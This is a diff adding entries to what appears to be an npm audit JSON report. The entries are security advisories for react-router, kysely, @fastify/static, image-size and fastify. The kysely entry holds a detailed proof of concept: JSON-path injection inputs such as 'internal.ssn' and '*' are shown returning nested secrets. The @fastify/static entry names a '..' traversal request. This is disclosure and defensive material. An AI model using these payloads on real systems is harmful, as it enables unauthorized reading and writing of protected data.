+      "overview": "A DoS vulnerability exists in the React Router v7 [Framework Mode](https://reactrouter.com/start/modes#framework), as well as Remix v2.9.0+ with [Single Fetch](https://v2.remix.run/docs/guides/single-fetch) enabled. In some scenarios the underlying serialization algorithm can become a bottleneck when encoding specific types of data into server responses.  Please upgrade to React Router v7.14.0 or later.\n\n> [!NOTE]\n> This does not impact your React Router application if you are using [Declarative Mode](https://reactrouter.com/start/modes#declarative) (`<BrowserRouter>`) or [Data Mode](https://reactrouter.com/start/modes#data) (`createBrowserRouter`/`<RouterProvider>`).",
+      "reported_by": null,
+      "title": "React Router vulnerable to Denial of Service via reflected user input in single-fetch",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-34077"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "react-router",
+      "vulnerable_versions": ">=7.0.0 <7.14.0",
+      "github_advisory_id": "GHSA-rxv8-25v2-qmq8",
+      "recommendation": "Upgrade to version 7.14.0 or later",
+      "patched_versions": ">=7.14.0",
+      "updated": "2026-06-04T15:23:51.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-rxv8-25v2-qmq8"
+    },
+    "1120248": {
+      "findings": [
+        {
+          "version": "0.28.7",
+          "paths": [
+            "apps__api>kysely"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/kysely-org/kysely/security/advisories/GHSA-pv5w-4p9q-p3v2\n- https://github.com/kysely-org/kysely/releases/tag/v0.28.17\n- https://nvd.nist.gov/vuln/detail/CVE-2026-44635\n- https://github.com/advisories/GHSA-pv5w-4p9q-p3v2",
+      "created": "2026-05-11T19:40:15.000Z",
+      "id": 1120248,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nKysely 0.28.12 added a `sanitizeStringLiteral()` call inside `DefaultQueryCompiler.visitJSONPathLeg` (commit `0a602bf`, PR #1727) to fix CVE-2026-32763 (`GHSA-wmrf-hv6w-mr66`). The fix only doubles single quotes (`'` → `''`); it does **not** escape JSON-path metacharacters (`.`, `[`, `]`, `*`, `**`, `?`). When attacker-controlled input flows into `eb.ref(col, '->$').key(input)` or `.at(input)` — including type-safe code where the JSON column is shaped like `Record<string, T>` so `K extends string` is the inferred type — every dot becomes a path-leg separator, letting an attacker traverse from the intended key into sibling and child fields the developer never meant to expose. The result is read access (and, in update statements, write access) to JSON sub-fields outside the intended scope across MySQL, PostgreSQL `->$`/`->>$`, and SQLite.\n\n* Project: Kysely — TypeScript SQL query builder (npm `kysely`); affects MySQL, PostgreSQL `->$`/`->>$`, and SQLite dialects.\n* Source reviewed: `kysely-org/kysely` @ `master` (`73192e4`, version `0.28.16`).\n* Deployed artefact validated: `kysely@0.28.16` from npm.\n* Affected file(s):\n  * `src/query-compiler/default-query-compiler.ts` (lines 1611–1639, 1821–1823)\n  * `src/query-builder/json-path-builder.ts` (lines 93–196)\n  * `src/dialect/mysql/mysql-query-compiler.ts` (overrides `sanitizeStringLiteral` but inherits the same behaviour for path legs — escapes `\\` and `'`, nothing else)\n* CWE: CWE-89 — Improper Neutralization of Special Elements used in an SQL Command, with CWE-915 / CWE-1284 (improper validation of specified quantity in input) flavours for the JSON-path sub-language.\n* OWASP 2021: A03:2021 — Injection.\n\n## Vulnerable code\n\n`src/query-compiler/default-query-compiler.ts:1625-1639`:\n\n```ts\nprotected override visitJSONPathLeg(node: JSONPathLegNode): void {\n  const isArrayLocation = node.type === 'ArrayLocation'\n\n  this.append(isArrayLocation ? '[' : '.')      // (1)\n\n  this.append(\n    typeof node.value === 'string'\n      ? this.sanitizeStringLiteral(node.value)  // (2)\n      : String(node.value),\n  )\n\n  if (isArrayLocation) {\n    this.append(']')\n  }\n}\n```\n\n`src/query-compiler/default-query-compiler.ts:1821-1823`:\n\n```ts\nprotected sanitizeStringLiteral(value: string): string {\n  return value.replace(LIT_WRAP_REGEX, \"''\")    // (3)\n}\n```\n\nwith `LIT_WRAP_REGEX = /'/g`.\n\n`src/query-builder/json-path-builder.ts:151-167`:\n\n```ts\nkey<\n  K extends any[] extends O\n    ? never\n    : O extends object\n      ? keyof NonNullable<O> & string\n      : never,\n  O2 = undefined extends O\n    ? null | NonNullable<NonNullable<O>[K]>\n    : null extends O\n      ? null | NonNullable<NonNullable<O>[K]>\n      : // when the object has non-specific keys, e.g. Record<string, T>, should infer `T | null`!\n        string extends keyof NonNullable<O>\n        ? null | NonNullable<NonNullable<O>[K]>\n        : NonNullable<O>[K],\n>(key: K): TraversedJSONPathBuilder<S, O2> {\n  return this.#createBuilderWithPathLeg('Member', key)  // (4)\n}\n```\n\n`src/query-builder/json-path-builder.ts:169-196`:\n\n```ts\n#createBuilderWithPathLeg(\n  legType: JSONPathLegType,\n  value: string | number,                                // (5)\n): TraversedJSONPathBuilder<any, any> {\n  // ...\n  return new TraversedJSONPathBuilder(\n    JSONPathNode.cloneWithLeg(\n      this.#node,\n      JSONPathLegNode.create(legType, value),            // (6)\n    ),\n  )\n}\n```\n\nAt (1) the compiler emits the path-leg separator — `.` for member access or `[` for array index. At (2) the user-supplied string is run through `sanitizeStringLiteral`, which at (3) only doubles single quotes (`'`). Dots, brackets, asterisks, double-asterisks and question marks — every reserved character of the SQL/JSON path mini-language — pass through unmodified.\n\nAt (4) `.key(K)` types `K` as `keyof NonNullable<O> & string`. When the JSON column is typed as `Record<string, T>` (a common shape for free-form metadata blobs) the inferred `K` is just `string`, so attacker-controlled input is **type-safe** and does not need a `Kysely<any>` escape hatch — this finding is *broader* than `GHSA-wmrf-hv6w-mr66` (CVE-2026-32763), which only covered the `Kysely<any>` case. At (5)/(6) the runtime accepts any `string | number` regardless of `legType`, so a string sent into `.at(...)` (`'last'`/`'#-N'` per the public type signature) also reaches the same emitter and can carry `]` to break out of the bracket.\n\nThe fix at `0a602bf` only addressed the single-quote → string-literal escape. The JSON-path metacharacter set was overlooked.\n\n`MysqlQueryCompiler.sanitizeStringLiteral` (`src/dialect/mysql/mysql-query-compiler.ts:47-51`) overrides the helper to also escape backslashes — but again, it does nothing for `. [ ] * ** ?`.\n\n## Reproduction (validated locally)\n\nEnvironment: `kysely@0.28.16` + `better-sqlite3@12.x`, Node 22, on macOS. The PoC harness lives in `/Users/admin/joplin_research/kysely-poc/`.\n\n### Step 1 — Compiled-SQL evidence across all three dialects\n\n`/Users/admin/joplin_research/kysely-poc/poc.mjs` (no DB, just `.compile()`):\n\n```bash\n$ node poc.mjs\n===== MySQL =====\n\n--- baseline: .key(\"nick\") ---\nSQL:     select `profile`->'$.nick' as `out` from `person`\n\n--- INJECTION via .key(ATTACKER) -- \"nick.secret_field\" ---\nSQL:     select `profile`->'$.nick.secret_field' as `out` from `person`\n\n--- INJECTION via .key(\"*\") -- wildcard reaches all keys ---\nSQL:     select `profile`->'$.*' as `out` from `person`\n\n--- INJECTION via .at(ATTACKER3) -- bracket escape ---\nSQL:     select `profile`->'$[].secret]' as `out` from `person`\n\n===== PostgreSQL (->$ uses jsonpath, MySQL-like) =====\n\n--- baseline: .key(\"nick\") ---\nSQL:     select \"profile\"->'$.nick' as \"out\" from \"person\"\n\n--- INJECTION via .key(ATTACKER) ---\nSQL:     select \"profile\"->'$.nick.secret_field' as \"out\" from \"person\"\n\n===== SQLite =====\n\n--- baseline: .key(\"nick\") ---\nSQL:     select \"profile\"->>'$.nick' as \"value\" from \"person\"\n\n--- INJECTION via .key(ATTACKER) ---\nSQL:     select \"profile\"->>'$.nick.secret_field' as \"out\" from \"person\"\n\n--- INJECTION via .key(\"*\") ---\nSQL:     select \"profile\"->>'$.*' as \"out\" from \"person\"\n```\n\nThe compiled SQL clearly shows the dot inside the user-supplied \"key\" being interpreted by the database as a path separator: `'$.nick'` (one leg) becomes `'$.nick.secret_field'` (two legs). MySQL additionally accepts `*` as a wildcard reaching every member at the current level.\n\n### Step 2 — End-to-end data disclosure on a real database\n\n`/Users/admin/joplin_research/kysely-poc/sqlite-runtime.mjs` simulates a typical handler that reads one top-level field of the caller's profile:\n\n```js\nasync function fetchProfileField(userInput) {\n  return db.selectFrom('me')\n    .select(eb => eb.ref('profile', '->>$').key(userInput).as('value'))\n    .where('id', '=', 1)\n    .execute()\n}\n```\n\nThe `me.profile` JSON column for user 1 is:\n\n```json\n{\n  \"nick\": \"alice\",\n  \"tagline\": \"hi\",\n  \"internal\": {\n    \"ssn\": \"111-11-1111\",\n    \"token\": \"tok_abcdef\",\n    \"admin\": true\n  }\n}\n```\n\nThe developer's intent: only top-level keys (`nick`, `tagline`) are ever requested. `internal` is private bookkeeping.\n\n```bash\n$ node sqlite-runtime.mjs\n===== Legitimate request =====\nuserInput = \"nick\"\n  compiled SQL:  select \"profile\"->>'$.nick' as \"value\" from \"me\" where \"id\" = ?\n  result:        [ { value: 'alice' } ]\n\n===== Injection: dot lets attacker reach nested \"internal\" object =====\nuserInput = \"internal.ssn\"\n  compiled SQL:  select \"profile\"->>'$.internal.ssn' as \"value\" from \"me\" where \"id\" = ?\n  result:        [ { value: '111-11-1111' } ]\n\nuserInput = \"internal.token\"\n  compiled SQL:  select \"profile\"->>'$.internal.token' as \"value\" from \"me\" where \"id\" = ?\n  result:        [ { value: 'tok_abcdef' } ]\n\nuserInput = \"internal.admin\"\n  compiled SQL:  select \"profile\"->>'$.internal.admin' as \"value\" from \"me\" where \"id\" = ?\n  result:        [ { value: 1 } ]\n```\n\nExpected vs. actual: the application invariant was \"the user can only read top-level keys of their profile\". The output violates that invariant — `internal.ssn`, `internal.token`, and `internal.admin` are returned even though `internal` was never meant to be addressable through this endpoint.\n\nThe same pattern is exploitable on MySQL (where `*` and `**` wildcards make it strictly worse — a single `*` enumerates every sibling at the current level in one row) and on PostgreSQL when using the `->$`/`->>$` operators (which target MySQL-style JSON-path strings on PG ≥ 17 / via `jsonb_path_query`).\n\n## Impact\n\n* **Authorization bypass on JSON sub-fields.** Any kysely-built query whose JSON-path key/index argument is partially or fully attacker-controlled — even in fully type-safe code where the column type is `Record<string, T>` — leaks data the developer believed was scoped behind the explicitly-listed key. SSNs, tokens, admin flags, internal IDs, anything stored as a nested member of the same JSON document is reachable.\n* **Wildcard reads on MySQL / PostgreSQL `->$`.** `key('*')` compiles to `'$.*'`, returning the array of every value at the current depth in one round-trip. `key('**')` recurses across the whole document. The fix does not strip either token.\n* **Write access in update statements.** Kysely uses the same path compiler for `update().set(eb => eb.ref(col, '->$').key(input), value)`-style writes (and `jsonb_set` helpers). An attacker who can drive both the path and the value can therefore write into nested fields they should not be able to set — for example flipping an `admin` flag or rewriting a nested role.\n* **Bypasses the recently-fixed precedent.** The maintainers shipped commit `0a602bf` (PR #1727) specifically to harden this surface. That fix removed the `'` (quote) primitive but left every JSON-path metacharacter alone, so the surface is still open against any caller that *thought* it was now safe.\n* **Practical bounding.** The attacker needs a code path where a request-derived string lands in `.key(...)` or `.at(...)`. This is a recognised pattern (filter-by-field, dynamic `select` for admin dashboards, Strapi-style JSON-blob columns); it is not a default kysely behaviour but is plausibly common. The vulnerable path is also exercised any time a developer writes `db as Kysely<any>` (covered by the older `GHSA-wmrf-hv6w-mr66` advisory) — but unlike that advisory, the bug here triggers in fully-typed code on `Record<string, T>` columns.\n\n## Suggested fix\n\nTreat path legs as a structured emission, not a string-literal escape. The narrowest safe patch is a dedicated `sanitizeJSONPathLeg` that only emits a known-good character set per leg type and rejects everything else, since JSON-path quoting differs by dialect (MySQL allows `\"…\"`-quoted member names; SQLite is more permissive but still has a grammar; PostgreSQL `jsonpath` is strict).\n\n```ts\n// src/query-compiler/default-query-compiler.ts\nconst JSON_PATH_MEMBER_OK = /^[A-Za-z_$][A-Za-z0-9_$]*$/\n\nprotected override visitJSONPathLeg(node: JSONPathLegNode): void {\n  if (node.type === 'ArrayLocation') {\n    this.append('[')\n    if (typeof node.value === 'number') {\n      this.append(String(node.value | 0))      // int-coerce\n    } else if (node.value === 'last' || /^#-\\d+$/.test(node.value)) {\n      this.append(node.value)                  // documented dialect tokens\n    } else {\n      throw new Error(`invalid JSON array index: ${node.value}`)\n    }\n    this.append(']')\n    return\n  }\n  // Member\n  this.append('.')\n  if (typeof node.value !== 'string' || !JSON_PATH_MEMBER_OK.test(node.value)) {\n    // Per-dialect quoted-member escape would go here; default = reject.\n    throw new Error(`invalid JSON path member: ${JSON.stringify(node.value)}`)\n  }\n  this.append(node.value)\n}\n```\n\nFor dialect-specific behaviour (MySQL `\"…\"`-quoted members, SQLite bracket-quoted), each dialect compiler should override the helper and apply the appropriate quoting + double-the-quote rule, the same way `sanitizeIdentifier` already does.\n\nConsider also: parameterise JSON paths whenever the dialect supports it (PostgreSQL `jsonb_path_query($1, $2)`, MySQL `JSON_EXTRACT(?, ?)`), so attacker-controlled keys are bound, not concatenated. Add a regression test to `test/node/src/json-traversal.test.ts` asserting that `eb.ref('c','->$').key('a.b').compile().sql` is **either** rejected, **or** emits MySQL `'$.\"a.b\"'` / SQLite `'$.[\"a.b\"]'` (quoted-member form), and explicitly differs from `key('a').key('b')`.\n\nA backstop hardening: tighten the `.at()` runtime to accept only `number | 'last' | '#-${digits}'` (matching the type signature), and tighten `.key()` to only accept strings that match `keyof O` at runtime when `O` is statically known.",
+      "reported_by": null,
+      "title": "Kysely: JSON-path traversal injection via unsanitized path-leg metacharacters in `JSONPathBuilder.key()` / `.at()`",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-44635"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "kysely",
+      "vulnerable_versions": ">=0.26.0 <0.28.17",
+      "github_advisory_id": "GHSA-pv5w-4p9q-p3v2",
+      "recommendation": "Upgrade to version 0.28.17 or later",
+      "patched_versions": ">=0.28.17",
+      "updated": "2026-06-08T23:53:32.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-22",
+        "CWE-89",
+        "CWE-915",
+        "CWE-1284"
+      ],
+      "url": "https://github.com/advisories/GHSA-pv5w-4p9q-p3v2"
+    },
+    "1124276": {
+      "findings": [
+        {
+          "version": "7.9.0",
+          "paths": [
+            "apps__web>react-router"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/remix-run/react-router/security/advisories/GHSA-chx6-hx7r-mcp5\n- https://github.com/remix-run/react-router/pull/15186\n- https://github.com/remix-run/react-router/commit/09e6020d1950e54f361f7ad00938ecd4dde60929\n- https://github.com/remix-run/react-router/blob/main/CHANGELOG.md#v7180\n- https://github.com/remix-run/react-router/releases/tag/react-router@7.18.0\n- https://github.com/advisories/GHSA-chx6-hx7r-mcp5",
+      "created": "2026-07-24T14:06:57.000Z",
+      "id": 1124276,
+      "npm_advisory_id": null,
+      "overview": "This is a follow up to https://github.com/remix-run/react-router/security/advisories/GHSA-8x6r-g9mw-2r78 that covers additional reported scenarios in which the manifest endpoint could be accessed via unauthenticated targeted requests that would put heavy load on the server and slow down response times.\n\n> [!NOTE]\n> This only impacts Framework Mode applications.  This does not impact your application if you are using Declarative or Data Mode.",
+      "reported_by": null,
+      "title": "React Router: Unauthenticated Denial of Service via Inefficient Route Matching",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-55685"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "react-router",
+      "vulnerable_versions": ">=7.0.0 <7.18.0",
+      "github_advisory_id": "GHSA-chx6-hx7r-mcp5",
+      "recommendation": "Upgrade to version 7.18.0 or later",
+      "patched_versions": ">=7.18.0",
+      "updated": "2026-07-24T14:06:58.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-407"
+      ],
+      "url": "https://github.com/advisories/GHSA-chx6-hx7r-mcp5"
+    },
+    "1124286": {
+      "findings": [
+        {
+          "version": "8.2.0",
+          "paths": [
+            "apps__api>@fastify/static"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/fastify/fastify-static/security/advisories/GHSA-83w8-p2f5-377r\n- https://nvd.nist.gov/vuln/detail/CVE-2026-15074\n- https://github.com/fastify/fastify-static/commit/db4276f846ba56b21f93768cd6636ee5e2fc58b1\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/fastify/fastify-static/releases/tag/v10.1.1\n- https://github.com/advisories/GHSA-83w8-p2f5-377r",
+      "created": "2026-07-24T16:43:21.000Z",
+      "id": 1124286,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\n`@fastify/static` is vulnerable to a bypass of route-based middleware and guards via non-leading `..` and `%2E%2E` path segments. `find-my-way` does not normalize `..` when matching routes, so a request such as `/foo/../deep/secret.txt` matches the static plugin's catch-all instead of the guarded `/deep/*`. The `getPathnameForSend` helper introduced by the fix for [GHSA-x428-ghpx-8j92](https://github.com/fastify/fastify-static/security/advisories/GHSA-x428-ghpx-8j92) only guards against the `%2F` variant; `..` and `%2E%2E` survive the `decodeURI` + `encodeURI` round-trip and are then collapsed away by `@fastify/send`'s `path.normalize` before its own traversal guard runs.\n\nApplications that rely on route-based middleware or guards to protect files served by `@fastify/static` can be bypassed with non-leading dot-dot path segments.\n\n### Patches\n\nUpgrade to `@fastify/static` 10.1.1.\n\n### Workarounds\n\nDo not use route-based middlewares or guards to protect files served by `@fastify/static`.",
+      "reported_by": null,
+      "title": "@fastify/static vulnerable to route guard bypass via path traversal",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-15074"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "@fastify/static",
+      "vulnerable_versions": "<=10.1.0",
+      "github_advisory_id": "GHSA-83w8-p2f5-377r",
+      "recommendation": "Upgrade to version 10.1.1 or later",
+      "patched_versions": ">=10.1.1",
+      "updated": "2026-07-24T16:43:21.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-22"
+      ],
+      "url": "https://github.com/advisories/GHSA-83w8-p2f5-377r"
+    },
+    "1193655": {
+      "findings": [
+        {
+          "version": "7.9.0",
+          "paths": [
+            "apps__web>react-router"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/remix-run/react-router/security/advisories/GHSA-8v8x-cx79-35w7\n- https://nvd.nist.gov/vuln/detail/CVE-2026-21884\n- https://github.com/remix-run/react-router/pull/14705\n- https://github.com/remix-run/react-router/commit/c89c32c562a7723c45ee71dab1c892acaf7a608d\n- https://access.redhat.com/errata/RHSA-2026:19712\n- https://access.redhat.com/errata/RHSA-2026:3782\n- https://access.redhat.com/errata/RHSA-2026:3958\n- https://access.redhat.com/errata/RHSA-2026:3960\n- https://access.redhat.com/security/cve/CVE-2026-21884\n- https://bugzilla.redhat.com/show_bug.cgi?id=2428421\n- https://github.com/remix-run/react-router/blob/react-router%407.12.0/CHANGELOG.md#v7120\n- https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-21884.json\n- https://github.com/advisories/GHSA-8v8x-cx79-35w7",
+      "created": "2026-01-08T20:50:05.000Z",
+      "id": 1193655,
+      "npm_advisory_id": null,
+      "overview": "A XSS vulnerability exists in in React Router's `<ScrollRestoration>` API in [Framework Mode](https://reactrouter.com/start/modes#framework) when using the `getKey`/`storageKey` props during Server-Side Rendering which could allow arbitrary JavaScript execution during SSR if untrusted content is used to generate the keys.\n\n> [!NOTE]\n> This does not impact applications if developers have [disabled server-side rendering](https://reactrouter.com/how-to/spa) in Framework Mode, or if they are using [Declarative Mode](https://reactrouter.com/start/modes#declarative) (`<BrowserRouter>`) or [Data Mode](https://reactrouter.com/start/modes#data) (`createBrowserRouter`/`<RouterProvider>`).",
+      "reported_by": null,
+      "title": "React Router SSR XSS in ScrollRestoration",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-21884"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "react-router",
+      "vulnerable_versions": ">=7.0.0 <7.12.0",
+      "github_advisory_id": "GHSA-8v8x-cx79-35w7",
+      "recommendation": "Upgrade to version 7.12.0 or later",
+      "patched_versions": ">=7.12.0",
+      "updated": "2026-09-08T16:29:56.000Z",
+      "cvss": {
+        "score": 8.2,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-79"
+      ],
+      "url": "https://github.com/advisories/GHSA-8v8x-cx79-35w7"
+    },
+    "1239765": {
+      "findings": [
+        {
+          "version": "1.2.1",
+          "paths": [
+            "packages__reporting>pptxgenjs>image-size"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2025-71329\n- https://joshua.hu/image-size-infinite-loop-dos-vulnerabilities\n- https://web.archive.org/web/20260224152152/https://github.com/image-size/image-size/pull/439\n- https://www.vulncheck.com/advisories/image-size-denial-of-service-via-infinite-loop-in-jxl-heif-parser\n- https://codeberg.org/image-size/image-size/commit/e6e83a5578961de81f6d5834d90fb7430d8f29a5\n- https://github.com/advisories/GHSA-5p2g-fcmc-qvqq",
+      "created": "2026-06-10T15:31:30.000Z",
+      "id": 1239765,
+      "npm_advisory_id": null,
+      "overview": "image-size through 2.0.2 contains a denial of service vulnerability that allows remote attackers to permanently block the Node.js event loop by supplying a specially crafted image buffer with a zero-valued size field in a recognized box-type. Attackers can trigger an infinite loop in the JXL or HEIF image parsers by providing a crafted image containing a box with a size of zero, causing the offset to never advance and permanently hanging the application.",
+      "reported_by": null,
+      "title": "image-size: JXL and HEIF parsers allow denial of service through infinite loops",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-71329"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "image-size",
+      "vulnerable_versions": ">=1.2.0 <=2.0.2",
+      "github_advisory_id": "GHSA-5p2g-fcmc-qvqq",
+      "recommendation": "Upgrade to version 2.0.3 or later",
+      "patched_versions": ">=2.0.3",
+      "updated": "2026-09-24T18:28:06.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-835"
+      ],
+      "url": "https://github.com/advisories/GHSA-5p2g-fcmc-qvqq"
+    },
+    "1239766": {
+      "findings": [
+        {
+          "version": "1.2.1",
+          "paths": [
+            "packages__reporting>pptxgenjs>image-size"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2025-71330\n- https://joshua.hu/image-size-infinite-loop-dos-vulnerabilities\n- https://web.archive.org/web/20260224152152/https://github.com/image-size/image-size/pull/439\n- https://www.vulncheck.com/advisories/image-size-denial-of-service-via-malformed-icns-image-parsing\n- https://codeberg.org/image-size/image-size/commit/e6e83a5578961de81f6d5834d90fb7430d8f29a5\n- https://github.com/advisories/GHSA-w3rx-r6r6-pgpr",
+      "created": "2026-06-10T15:31:30.000Z",
+      "id": 1239766,
+      "npm_advisory_id": null,
+      "overview": "image-size through 2.0.2 contains a denial of service vulnerability that allows remote attackers to permanently block the Node.js event loop by supplying a specially crafted ICNS image buffer. Attackers can craft an ICNS buffer containing valid magic bytes and a zero-valued entry length field to trigger an infinite loop in the ICNS parser, as the offset is never incremented when the entry length field is 0, causing the while loop condition to remain true indefinitely.",
+      "reported_by": null,
+      "title": "image-size: ICNS parser allows denial of service through an infinite loop",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-71330"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "image-size",
+      "vulnerable_versions": ">=0.6.3 <=2.0.2",
+      "github_advisory_id": "GHSA-w3rx-r6r6-pgpr",
+      "recommendation": "Upgrade to version 2.0.3 or later",
+      "patched_versions": ">=2.0.3",
+      "updated": "2026-09-24T18:23:12.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-835"
+      ],
+      "url": "https://github.com/advisories/GHSA-w3rx-r6r6-pgpr"
+    },
+    "1240641": {
+      "findings": [
+        {
+          "version": "5.6.1",
+          "paths": [
+            "apps__api>fastify"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/fastify/fastify/security/advisories/GHSA-667r-xxjv-c9mm\n- https://nvd.nist.gov/vuln/detail/CVE-2026-84504\n- https://github.com/fastify/fastify/commit/f02d8d4ab1ab208f10819c4dc213595b06497833\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/fastify/fastify/releases/tag/v5.12.2\n- https://github.com/advisories/GHSA-667r-xxjv-c9mm",
+      "created": "2026-09-30T23:45:45.000Z",
+      "id": 1240641,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nFastify runs a route's validator and, for a result shaped like `{ value, error }`, unwraps it: an `error` becomes a validation failure and `value` replaces the request part. This convention is intended for synchronous custom compilers (for example Joi). A JSON Schema `$async` validator, however, resolves with the validated data itself, so Fastify applied the same unwrapping to it. If a request part validated by an `$async` schema contains a `value` property, Fastify replaced the whole request part with that nested value before the handler ran, so a `value` or `error` property in the payload was attacker-controlled. An application that dispatches operations from the validated request body could then act on data that never satisfied the route schema, leading to unauthorized state changes or disclosure. Reaching the vulnerable path requires the route to use an `$async` request schema.\n\n### Patches\n\nFastify no longer treats an asynchronous validation result as a `{ value, error }` wrapper: an async validator's resolved value is used only to determine pass or fail, and it can no longer replace the request part or inject an error. The synchronous custom-compiler contract is unchanged. Patched in fastify `5.12.2` and `6.0.0`.\n\n### Workarounds\n\nIf upgrading is not immediately possible, avoid `$async` request schemas, or perform the security-sensitive check in an `onRequest` or `preHandler` hook rather than relying on the schema-validated request part. Custom async validator compilers should signal failure by throwing (rejecting) rather than returning an `{ error }` object.",
+      "reported_by": null,
+      "title": "fastify vulnerable to request body replacement via an async validation result collision",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-84504"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "fastify",
+      "vulnerable_versions": "<5.12.2",
+      "github_advisory_id": "GHSA-667r-xxjv-c9mm",
+      "recommendation": "Upgrade to version 5.12.2 or later",
+      "patched_versions": ">=5.12.2",
+      "updated": "2026-09-30T23:45:46.000Z",
+      "cvss": {
+        "score": 8.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-20"
+      ],
+      "url": "https://github.com/advisories/GHSA-667r-xxjv-c9mm"
+    },
+    "1240642": {
+      "findings": [
+        {
+          "version": "5.6.1",
+          "paths": [
+            "apps__api>fastify"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/fastify/fastify/security/advisories/GHSA-p68q-wchp-6fh7\n- https://nvd.nist.gov/vuln/detail/CVE-2026-76169\n- https://github.com/fastify/fastify/commit/93c239a380f3f2778bb7565fcdf777e91cfe1fbc\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/fastify/fastify/releases/tag/v5.12.2\n- https://github.com/advisories/GHSA-p68q-wchp-6fh7",
+      "created": "2026-09-30T23:45:34.000Z",
+      "id": 1240642,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nFastify routes a malformed URL under one plugin prefix to the custom not-found handler of a different sibling plugin, invoking the handler registered last and skipping the `preHandler` declared in its `setNotFoundHandler()`. When the request method has no route in the main router, a malformed request target reaches Fastify's internal not-found router before URL decoding and is dispatched through a single shared handler pointer, regardless of prefix and without the normal request lifecycle. An unauthenticated request to a public prefix can therefore reach an authentication-protected not-found handler registered under a different prefix and receive its full response, breaking prefix encapsulation and bypassing the authentication hook. Applications whose private or tenant fallbacks return protected data from a not-found handler are affected.\n\n### Patches\n\nPatched in fastify 5.12.2. Malformed URLs are now routed through the configured `onBadUrl` and `onMaxParamLength` handlers so they fail closed before any application not-found handler runs, and the shared not-found handler pointer has been removed.\n\n### Workarounds\n\nReject malformed request targets before they reach the application, for example at an upstream proxy or gateway, and do not rely on a not-found handler to serve protected data. A global `onRequest` authentication hook does not mitigate this, because the malformed-URL path skips it.",
+      "reported_by": null,
+      "title": "fastify vulnerable to authentication bypass via malformed URLs reaching encapsulated not-found handlers",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-76169"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "fastify",
+      "vulnerable_versions": ">=4.0.0 <5.12.2",
+      "github_advisory_id": "GHSA-p68q-wchp-6fh7",
+      "recommendation": "Upgrade to version 5.12.2 or later",
+      "patched_versions": ">=5.12.2",
+      "updated": "2026-09-30T23:45:35.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-288"
+      ],
+      "url": "https://github.com/advisories/GHSA-p68q-wchp-6fh7"
+    },
+    "1240643": {
+      "findings": [
+        {
+          "version": "5.6.1",
+          "paths": [
+            "apps__api>fastify"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
